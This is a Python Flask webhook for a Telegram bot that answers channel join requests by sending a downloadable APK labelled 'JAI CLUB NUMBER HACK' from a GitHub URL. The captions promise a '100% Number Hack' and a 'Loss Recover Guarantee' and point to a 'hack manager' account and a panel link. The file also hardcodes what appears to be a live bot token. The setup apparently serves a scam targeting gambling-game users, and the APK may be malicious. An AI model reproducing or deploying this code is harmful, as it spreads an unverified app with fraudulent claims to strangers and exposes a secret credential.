import os
import asyncio
import requests
from io import BytesIO
from flask import Flask, request
from telegram import Update, Bot

# ================= CONFIG =================
BOT_TOKEN = "8647299391:AAFElYz6ARGQSakXH0Ir6xNCGzeLTknR9Mo"
APK_URL = "https://raw.githubusercontent.com/toptenowner999-maker/KD/2301c244938dcdaa227fc13913abeca114beae95/JAI~CLUB%20NUMBER%20HACK_1.0.apk"
WELCOME_PHOTO_URL = "https://raw.githubusercontent.com/toptenowner999-maker/KD/69738a5485ee3039cff79f9974ccc6de0b75e494/IMG_20260511_111128_792.jpg"

# Header Layout (3 + 4 + 4)
APK_CAPTION = (
    "<tg-emoji emoji-id='5969535994867749505'>🔠</tg-emoji> <tg-emoji emoji-id='5972019031425683213'>🔠</tg-emoji> <tg-emoji emoji-id='5969897592459366058'>🔠</tg-emoji>    " 
    "<tg-emoji emoji-id='5971996336818491960'>🔠</tg-emoji> <tg-emoji emoji-id='5969928280000695552'>🔠</tg-emoji> <tg-emoji emoji-id='5972235673871060829'>🔠</tg-emoji> <tg-emoji emoji-id='5969920372965904377'>🔠</tg-emoji>    " 
    "<tg-emoji emoji-id='5969666596233290681'>🔠</tg-emoji> <tg-emoji emoji-id='5972019031425683213'>🔠</tg-emoji> <tg-emoji emoji-id='5971996336818491960'>🔠</tg-emoji> <tg-emoji emoji-id='5969896827955187163'>🔠</tg-emoji>\n\n"
    "𝟭𝟬𝟬% 𝗡𝘂𝗺𝗯𝗲𝗿 𝗛𝗮𝗰𝗸 💥\n\n𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗲𝗿𝘀 💎\n\n𝟭𝟬𝟬% 𝗟𝗼𝘀𝘀 𝗥𝗲𝗰𝗼𝘃𝗲𝗿 𝗚𝘂𝗮𝗿𝗮𝗻𝘁𝗲𝗲 🛡\n\n𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 ➡️ @KD_HACK_MANAGER ✅"
)

WELCOME_CAPTION = (
    "🤑 MEMBERS FEEDBACK 🤑\n\n"
    "💎 BEST HACK AND GENUINE STREAK WINNING 💎\n\n"
    "⬇️ PANNEL LINK ⬇️\n\n"
    "https://t.me/m/kkE6P6nfZDhl"
)

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

async def process_assets(user_id):
    """Assets bhejne ka kaam bina Vercel ko hang kiye"""
    try:
        # APK Bhejna
        await bot.send_document(
            chat_id=user_id, 
            document=APK_URL, 
            filename="JAI_CLUB_HACK.apk", 
            caption=APK_CAPTION, 
            parse_mode="HTML"
        )
        # Photo Bhejna
        await bot.send_photo(
            chat_id=user_id, 
            photo=WELCOME_PHOTO_URL, 
            caption=WELCOME_CAPTION, 
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Error sending to {user_id}: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == "POST":
        try:
            update = Update.de_json(request.get_json(force=True), bot)
            
            # Agar koi channel join request aayi ho
            if update.chat_join_request:
                user_id = update.chat_join_request.from_user.id
                # Vercel's sync handler needs to run the async task
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(process_assets(user_id))
                loop.close()
                
            return "OK", 200
        except Exception as e:
            print(f"Webhook Crash: {e}")
            return "Internal Error", 500
    return "Forbidden", 403

@app.route('/')
def index():
    return "Bot status: Running", 200
